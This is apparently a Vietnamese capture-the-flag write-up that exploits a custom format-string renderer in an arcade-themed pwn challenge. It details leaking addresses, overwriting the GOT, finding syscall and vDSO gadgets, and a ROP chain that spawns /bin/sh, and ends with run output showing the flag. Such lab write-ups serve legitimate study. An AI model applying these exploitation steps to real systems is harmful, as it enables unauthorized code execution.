# Print Print Revolution — Pwn (Hard)

**Flag:** `sun{cust0m_fmtstr_n0_t00ls_4ll0wed}` · Files: `revolution`, 14520 byte, sha256 `918483831ef0b27d0cfb8afa9e0341f38d0a296931ccc5f73ef80f5d610f8fa5` · Dịch vụ: `nc chal.sunshinectf.games 26002`

## Đề bài

Máy in điểm của một máy arcade nhả ra những vé kỳ lạ. Nhiệm vụ: bước tới chỗ
renderer và xem nó thực sự in ra cái gì. Chỉ có một ELF stripped và một cổng TCP.

Chính chuỗi cờ là tóm tắt bài: format string tự viết, không cho phép dùng tool.
Máy của mình không có pwntools, không có ROPgadget, không có WSL, và đề không
kèm file libc - nên mọi mảnh ghép phải lấy từ thứ đang chạy trong dịch vụ.

## Phân tích ban đầu

ELF 64-bit, `ET_EXEC` (no PIE, base `0x400000`), stripped, `.text` chỉ 0x4ea byte.
Import đúng năm hàm: `write strlen strcspn read setvbuf`. Không có `open`/`fopen`,
tức binary không tự đọc file được - muốn có `/ctf/flag.txt` thì phải có thực
th thi.

Vòng chính ở `0x4010d0`:

```asm
lea    rbx, [rsp]           ; buf = rsp của main, 512 byte
sub    rsp, 0x200
loop:  write(1,"score> ",7)
       read(0, rbx, 0x1ff)  ; rax = số byte đọc được
       mov  rsi, rbp        ; "\n"
       mov  rdi, rbx
       mov  [rsp+rax], 0
       call strcspn@plt     ; -> rax = độ dài dòng
       xor  eax, eax
       call 0x401330        ; RENDERER(rdi = buf)
       write(1,"\n",1)
       jmp  loop
```

`0x401330` không phải printf của libc. Nó dựng một `va_list` giả ngay trên stack:

```asm
mov [rsp+0x38], rsi ; [rsp+0x40], rdx ; [rsp+0x48], rcx ; [rsp+0x50], r8 ; [rsp+0x58], r9
mov [rsp+0x18], 8   ; gp_offset     mov [rsp+0x1c], 0x30 ; fp_offset
lea rax,[rsp+0x120]; mov [rsp+0x20], rax ; overflow_arg_area = rsp+0x120
lea rax,[rsp+0x30];  mov [rsp+0x28], rax ; reg_save_area     = rsp+0x30
```

Và `rsp+0x120` của renderer chính là `buf` (renderer cách main đúng
6 lần `push` + 8 byte return + `sub 0xe8` = 0x128 byte). Nên tham số thứ 6 trở đi
đọc thẳng từ input của mình.

## Chuỗi khai thác

**Bước 1 - Đọc grammar của renderer.** Nhánh so sánh ở `0x4013e8..0x401524` cho
thấy bốn đặc tả:

| Đặc tả | Hành vi | Primitive |
|---|---|---|
| `%%` | in `%` | - |
| `%<n>$s` | `write(1, (char*)arg[n], strlen(arg[n]))` | đọc tuỳ ý |
| `%<n>$p` / `%<n>$x` | in `0x%016lx` của `arg[n]` | leak tuỳ ý |
| `%<n>$w` | `*arg[n] = arg[n+1]`, in `ok` | ghi 8 byte tuỳ ý |

với `arg[6+k] = buf[8k]`. Chi tiết quyết định: hàm `va_arg` ở `0x4012c0` nạp `ap`
bằng `movdqu` (bản sao) và chỉ tăng offset trong bản sao đó, không bao giờ ghi
ngược về bộ nhớ. Nên nó stateless, và `%8$w` lấy cặp (arg8, arg9) chứ không
phải (arg8, arg17) như `printf` thật.

Xác định vị trí `buf`: `arg70 = buf[0x200]` chính là chỗ `rbx` được lưu lại, nên
`%70$p` cho ra địa chỉ buffer. `arg119` là `AT_SYSINFO_EHDR` trong `auxv`, cho ra
địa chỉ vDSO.

**Bước 2 - GOT ghi được dù "RELRO".** `PT_GNU_RELRO` phủ `[0x403dc0, 0x404000)`,
nhưng các slot PLT lại nằm từ `0x404000`:

```
write=0x404000 strlen=0x404008 strcspn=0x404010 read=0x404018 setvbuf=0x404020
```

và `.plt.sec` nhảy qua đúng các ô đó (`jmp [rip+0x2f66]` → `0x404010`). Giá trị
đang là stub lazy (`0x401030`...) nên BIND_NOW không bật. GOT là vùng ghi được.

**Bước 3 - Gadget `syscall` mà không cần file libc.** Đọc `write@GOT` → địa chỉ
thật của `write` trong libc đang chạy. Đọc từng byte trong 0x40 byte đầu của nó
(mỗi lần `%<n>$s` trả về tới byte 0 kế tiếp) → gặp `0f 05` ở `write+0x12`.

**Bước 4 - Gadget đặt tham số, lấy từ vDSO.** Binary không có `pop rsi/rdx/rax;
ret`; quét libc ±0x30000 cũng không. Nhưng tại `vdso+0xa14` có cả một dãy:

```
xor edx,edx ; xor ecx,ecx ; xor esi,esi ; xor edi,edi ;
xor r8d,r8d ; xor r9d,r9d ; xor r10d,r10d ; xor r11d,r11d ; ret
```

Điểm ăn tiền: nó không có `xor eax,eax`, nên `rax` giữ nguyên.

**Bước 5 - Mã syscall lấy từ đâu?** Không có `pop rax`. Nhưng tại `call
strcspn@plt` (`0x40112a`), `rax` = đúng số byte `read()` vừa trả về. Vậy số byte
mình gửi đi chính là mã syscall đầu tiên. Muốn `execve` thì gửi đúng 59 byte.

**Bước 6 - Chuỗi ROP.** Ghi `strcspn@GOT := pop rdi; ret` (`0x4014a1`, nằm trong
5-byte nop ngay trước `pop r15; ret`) để chuỗi bắt đầu tại `buf[0]`:

```
buf[0x00] = vdso+0xa14     ; rsi = rdx = 0, rax vẫn 59
buf[0x08] = 0x4014a1       ; pop rdi; ret
buf[0x10] = buf+0x100      ; &"/bin/sh"
buf[0x18] = write+0x12     ; syscall  ->  execve("/bin/sh", NULL, NULL)
buf[0x20] = 0x40114f       ; chỉ dùng nếu execve fail
```

Chuỗi vừa khít 59 byte. Chuỗi `/bin/sh` được đặt sẵn ở `buf+0x100` bằng `%<n>$w`
từ lần gửi trước, vì `read()` chỉ phủ được 59 byte đầu. Toàn bộ chuỗi không chứa
ký tự `%` nào và byte 0 đầu tiên nằm sau cả năm slot, nên renderer không kịp phân
tích gì: syscall xảy ra ngay tại `call strcspn`, trước khi renderer được gọi.

**Bước 7 - Kiểm chứng tính đúng.** Trước khi tin vào kết quả, chạy một biến thể
control: thay ô `buf[0x18]` bằng `0x40114f` để chuỗi không gọi syscall nào cả.
Control trả về `score> ` bình thường, chứng minh chuỗi chạy trọn vẹn và plumbing
đúng. Sau đó chỉ đường dẫn `/bin/sh` là im lặng rồi nhận lệnh - khác hẳn hành vi
của `/nonexistent` (in lại `score> `).

## Flag
```bash
python exploit.py
```

```
[*] buf=0x7fffd0f0b0a8  vdso=0x7ae9f6832000  write=0x7ae9f6732560  syscall=0x7ae9f6732572
[*] ghi GOT + duong dan: 2 x 'ok'
[>] cat /ctf/flag.txt -> sun{cust0m_fmtstr_n0_t00ls_4ll0wed}
[+] CO: sun{cust0m_fmtstr_n0_t00ls_4ll0wed}
```
